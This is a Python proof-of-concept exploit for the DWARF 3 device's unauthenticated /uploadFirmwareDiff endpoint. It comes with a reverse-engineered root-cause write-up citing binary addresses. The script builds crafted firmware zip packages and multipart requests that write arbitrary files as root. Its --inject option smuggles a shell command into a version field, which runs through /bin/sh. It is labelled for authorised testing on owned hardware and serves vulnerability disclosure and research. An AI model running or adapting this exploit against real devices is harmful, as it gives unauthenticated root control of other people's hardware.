#!/usr/bin/env python3
"""
DWARF 3 - unauthenticated arbitrary file write as root via /uploadFirmwareDiff

Verified by static analysis against firmware v1.5.4.1 (bin/magni, aarch64).

Root cause
----------
POST /uploadFirmwareDiff (TCP 8082, no authentication) stores the uploaded
package at "/tmp/" + sanitise(filename) and then, on message-complete, calls
the installer via a thunk:

    0x7f63c8  bl 0x9b2dc0      ; -> b 0x9b0958   applyUpdate()
    0x7f63cc  mov w23, w0      ; becomes the HTTP response "code"

applyUpdate() iterates the fixed module dirs bin/libs/config/mcu, parses each
module's update.json (0x9abf70) for the keys

    name   target_path   is_directory   need_execute

and then executes, through posix_spawn("/bin/sh", ["-c", cmd]) at 0x9d2340:

    "cp " + src + " " + dst          (0x9b140c, separator " " @ 0xda3680)
    "bspatch " + old + " " + new     (0x9b2464)

target_path is taken verbatim from the attacker-supplied update.json. There is
no prefix whitelist, no canonicalisation, and no realpath() anywhere in the
installer region 0x9a8000-0x9b3000 - the ".." literal at 0xd65990 is only
referenced by the multipart filename checks (0x83fe08, 0x83fefc, 0x84134c).
There is also no signature verification of the package; the only integrity
check is an MD5 supplied in the same request.

Because the cp command is built unquoted and run through /bin/sh, target_path
is additionally a command-injection sink (use --inject to demonstrate).

Request shape required by 1.5.4.1
---------------------------------
  * Content-Type: multipart/form-data with a parseable boundary  (else -2)
  * a non-file part named exactly "firmwareInfo" (0x841e6c)      (else -2)
      carrying {"data": {...}}  - the "data" wrapper is required (0x822350)
  * a file part whose filename= contains no '/', '\' or '..'     (else -2)

Authorised testing only - run this against hardware you own.
"""

import argparse
import hashlib
import io
import json
import re
import sys
import urllib.error
import urllib.request
import uuid
import zipfile

# code -> meaning, recovered from magni 1.5.4.1
ERROR_CODES = {
    0:   "success",
    -1:  "generic failure in the installer                 [0x9b15d8/0x9b188c]",
    -2:  "malformed multipart: bad Content-Type/boundary, wrong part name, "
         "or filename contained / \\ or ..",
    -3:  "check md5 failed                                 [0x9b0ff8]",
    -7:  "device not match (deviceId mismatch)             [0x7f6308]",
    -9:  "copy bin to zip path failed                      [0x9b1900]",
    -10: "VERSION ERROR - oldVersion/newVersion rejected   [0x9b10a8/0x9b12d8]",
    -15: "old_firmware_file not found (diff baseline)      [0x9b1760]",
    -16: "another upload already in progress ('admission') [0x7f5b2c]",
}

MODULES = ("iq", "bin", "libs", "config", "mcu", "model")


def build_package(payload_name, payload_bytes, target_path,
                  need_execute, module, schema="root"):
    """Two different installers, two different manifest schemas.

    schema="root"  -> magni, at UPLOAD time (no reboot needed):
        system("unzip <pkg> -o -d /tmp")      0x7fd90c
        read /tmp/update.json                 0x7fd8dc   <- ZIP ROOT
        for e in fileInfo: name, path, needExecute       0x7fde68/0x7fde80/0x7fde9c
        system("mv /tmp/<name> <path>")       0x7fdf2c

    schema="module" -> magni_upgrade, at BOOT:
        <module>/update.json with name, target_path,
        is_directory, need_execute            0x9ac008/0x9ac058/...
    """
    def mkdir(z, name):
        """Explicit directory entry. libzip-based extractors only mkdir for
        these; without them <extract>/bin etc. never exist and the installer
        logs 'Directory not found: bin'."""
        zi = zipfile.ZipInfo(name.rstrip("/") + "/")
        zi.external_attr = (0o40755 << 16) | 0x10        # S_IFDIR | MS_DIRECTORY
        z.writestr(zi, b"")

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        if schema == "root":
            manifest = {"fileInfo": [{"name": payload_name,
                                      "path": target_path,
                                      "needExecute": 1 if need_execute else 0}]}
            z.writestr("update.json", json.dumps(manifest, indent=2))
            z.writestr(payload_name, payload_bytes)
        else:
            entry = {"name": payload_name, "target_path": target_path,
                     "is_directory": False,
                     "need_execute": 1 if need_execute else 0}
            for mod in MODULES:
                mkdir(z, mod)
            for mod in MODULES:
                z.writestr(f"{mod}/update.json",
                           json.dumps({"fileInfo": [entry] if mod == module
                                       else []}, indent=2))
            z.writestr("mcu/update_rgb.json",
                       json.dumps({"fileInfo": []}, indent=2))
            z.writestr(f"{module}/{payload_name}", payload_bytes)
    return buf.getvalue()


def build_metadata(zip_bytes, package_name, device_id,
                   new_version, old_version, update_file_type, update_type):
    """Note the mandatory "data" wrapper - magni reads it at 0x822350."""
    digest = hashlib.md5(zip_bytes).hexdigest()
    return {
        "data": {
            "deviceId": device_id,
            "fileMd5": digest,
            "fullFileMd5": digest,
            "fileName": package_name,
            "fileSize": len(zip_bytes),
            "updateFileType": update_file_type,
            "updateType": update_type,
            "newVersion": new_version,
            "oldVersion": old_version,
        }
    }


def encode_multipart(metadata, package_name, zip_bytes):
    boundary = uuid.uuid4().hex
    sep = f"--{boundary}\r\n".encode()
    body = io.BytesIO()

    # part 1: the metadata field. The name MUST be "firmwareInfo".
    body.write(sep)
    body.write(b'Content-Disposition: form-data; name="firmwareInfo"\r\n')
    body.write(b"Content-Type: application/json\r\n\r\n")
    body.write(json.dumps(metadata).encode())
    body.write(b"\r\n")

    # part 2: the package itself. Presence of filename= is what makes magni
    # treat this as a file part (ctx->0x140 != 0, checked at 0x841da4).
    body.write(sep)
    body.write(
        f'Content-Disposition: form-data; name="file"; '
        f'filename="{package_name}"\r\n'.encode()
    )
    body.write(b"Content-Type: application/octet-stream\r\n\r\n")
    body.write(zip_bytes)
    body.write(b"\r\n")

    body.write(f"--{boundary}--\r\n".encode())
    return boundary, body.getvalue()


def vtuple(v):
    """Numeric prefix only - magni parses versions with a stringstream
    (0x9b5040), so trailing junk after the digits is ignored by the gate."""
    out = []
    for part in v.split("."):
        m = re.match(r"\d+", part)
        if not m:
            break
        out.append(int(m.group()))
    return tuple(out) or None


def http(method, url, data=None, headers=None, timeout=30):
    req = urllib.request.Request(url, data=data,
                                 headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def recon(base):
    # /firmwareVersion is registered as POST (http_method_enum arg at the
    # AddRoute site 0x7f1af4) - a GET returns 404.
    print(f"[*] POST {base}/firmwareVersion")
    status, body = http("POST", f"{base}/firmwareVersion", data=b"{}",
                        headers={"Content-Type": "application/json"})
    print(f"    HTTP {status}: {body[:400].decode(errors='replace')}")
    try:
        d = json.loads(body)
        d = d.get("data", d)
        parts = [d.get(k) for k in
                 ("majorVersion", "minorVersion", "patchVersion",
                  "buildVersion")]
        if all(p is not None for p in parts):
            return ".".join(str(p) for p in parts)
    except Exception:
        pass
    return None


def main():
    ap = argparse.ArgumentParser(
        description="DWARF 3 /uploadFirmwareDiff arbitrary-write PoC "
                    "(authorised testing only)")
    ap.add_argument("host", help="device IP, e.g. 192.168.88.1")
    ap.add_argument("--port", type=int, default=8082)

    ap.add_argument("--target", default="/tmp",
                    help="target_path written into update.json. This is the "
                         "directory the file is copied into. "
                         "(default: %(default)s - deliberately harmless)")
    ap.add_argument("--name", default="poc_marker",
                    help="filename inside the package / at the destination")
    ap.add_argument("--payload-file",
                    help="read payload bytes from this local file")
    ap.add_argument("--payload", default="dwarf3 target_path PoC\n",
                    help="literal payload text if --payload-file is absent")
    ap.add_argument("--execute", action="store_true",
                    help="set need_execute=1 (installer chmod +x's the file)")
    ap.add_argument("--module", default="bin", choices=MODULES,
                    help="only used by --schema module")
    ap.add_argument("--schema", default="module", choices=("root", "module"),
                    help="root: magni's /tmp/update.json installer, runs at "
                         "upload time, keys name/path/needExecute (default). "
                         "module: magni_upgrade's boot installer, keys "
                         "name/target_path/need_execute")

    ap.add_argument("--inject", metavar="SHELL",
                    help="Append '; SHELL; #' to a version field. The version "
                         "strings are NOT sanitised and are concatenated into "
                         "shell commands run via posix_spawn(/bin/sh -c) at "
                         "0x9d2340. Verify with --update-file-type 1, which "
                         "logs the full command as cmd_bspatch.")
    ap.add_argument("--inject-field", default="old",
                    choices=("old", "new"),
                    help="which version field carries the payload "
                         "(default: old - it builds the old_firmware_file "
                         "path that cmd_bspatch logs verbatim)")

    ap.add_argument("--device-id", type=int, default=2)
    ap.add_argument("--new-version",
                    help="must be strictly greater than the device version; "
                         "default: current with build+1")
    ap.add_argument("--old-version",
                    help="must equal the device's CURRENT version exactly - "
                         "a mismatch is the usual cause of code -10")
    ap.add_argument("--update-file-type", type=int, default=0,
                    help="0/2/3 = full upgrade (install runs now). "
                         "1 = diff mode: upload is passed to bspatch as a "
                         "patch file and never installed (default: 0)")
    ap.add_argument("--update-type", type=int, default=0)

    ap.add_argument("--package-name",
                    help="multipart filename=. Default is "
                         "dwarf3_upgrade_firmware_v<newVersion>.zip - the "
                         "installer parses the version back out of this name "
                         "('Extracted version part: %%s from file %%s'), so it "
                         "should match newVersion. Must survive the sanitiser: "
                         "[A-Za-z0-9._-] only, and no '..'")
    ap.add_argument("--dry-run", action="store_true",
                    help="build and print the request, send nothing")
    args = ap.parse_args()

    base = f"http://{args.host}:{args.port}"

    current = None
    if not args.dry_run:
        current = recon(base)
        print(f"[*] current version: {current or 'unknown'}\n")

    if not args.old_version and not current:
        sys.exit("[!] could not read the device version and --old-version was "
                 "not given.\n"
                 "    oldVersion must match the device exactly or you get -10.\n"
                 "    Read it from the app, or pass e.g. --old-version 1.5.4.1")
    old_version = args.old_version or current
    if args.new_version:
        new_version = args.new_version
    elif current:
        p = current.split(".")
        p[-1] = str(int(p[-1]) + 1)
        new_version = ".".join(p)
    else:
        p = old_version.split(".")
        p[-1] = str(int(p[-1]) + 1)
        new_version = ".".join(p)

    target = args.target
    if args.inject:
        payload = f"; {args.inject}; #"
        if args.inject_field == "old":
            old_version = old_version + payload
        else:
            new_version = new_version + payload
        print(f"[*] injecting into {args.inject_field}Version")

    ov, nv = vtuple(old_version), vtuple(new_version)
    if ov and nv and nv <= ov:
        sys.exit(f"[!] newVersion ({new_version}) must be STRICTLY GREATER "
                 f"than the device version ({old_version}).\n"
                 f"    magni compares them at 0x9b0e04 and returns -10.\n"
                 f"    Note every accepted upload bumps the device version, "
                 f"so re-running\n"
                 f"    with a pinned --new-version will fail the second time. "
                 f"Omit it to auto-bump.")

    package_name = args.package_name or \
        f"dwarf3_upgrade_firmware_v{new_version}.zip"
    if ".." in package_name or "/" in package_name or "\\" in package_name:
        sys.exit("[!] package name would be rejected with code -2")

    if args.payload_file:
        payload = open(args.payload_file, "rb").read()
    else:
        payload = args.payload.encode()

    zip_bytes = build_package(args.name, payload, target,
                              args.execute, args.module, args.schema)
    meta = build_metadata(zip_bytes, package_name, args.device_id,
                          new_version, old_version,
                          args.update_file_type, args.update_type)
    boundary, body = encode_multipart(meta, package_name, zip_bytes)

    print(f"[*] schema       : {args.schema}")
    print(f"[*] target_path  : {target}")
    print(f"[*] name         : {args.name}")
    print(f"[*] need_execute : {1 if args.execute else 0}")
    print(f"[*] versions     : {old_version} -> {new_version}")
    print(f"[*] package name : {package_name}")
    print(f"[*] package      : {len(zip_bytes)} bytes, "
          f"md5 {meta['data']['fileMd5']}")
    print(f"[*] expected dest: {target.rstrip('/')}/{args.name}")

    if args.dry_run:
        print("\n--- firmwareInfo ---")
        print(json.dumps(meta, indent=2))
        print(f"\n[*] dry run, {len(body)} body bytes not sent")
        return

    print(f"\n[*] POST {base}/uploadFirmwareDiff")
    status, resp = http(
        "POST", f"{base}/uploadFirmwareDiff", data=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
        },
        timeout=120,
    )
    text = resp.decode(errors="replace")
    print(f"[*] HTTP {status}: {text[:600]}")

    try:
        code = json.loads(resp).get("code")
    except Exception:
        code = None
    if code is not None:
        print(f"[*] code {code}: {ERROR_CODES.get(code, 'unknown')}")
        if code == 0:
            if args.update_file_type == 1:
                print("[!] update_file_type=1 is DIFF mode: your upload is fed "
                      "to bspatch as a")
                print("    patch and discarded. Use --update-file-type 0 for "
                      "the full-upgrade branch.")
            else:
                print(f"[+] installed: {target.rstrip('/')}/{args.name}"
                      + ("  (chmod +x)" if args.execute else ""))
        elif code == -10:
            print("[!] version gate. oldVersion must equal the device's "
                  "current version")
            print("    exactly, and newVersion must be strictly greater. "
                  "Pass --old-version.")


if __name__ == "__main__":
    main()
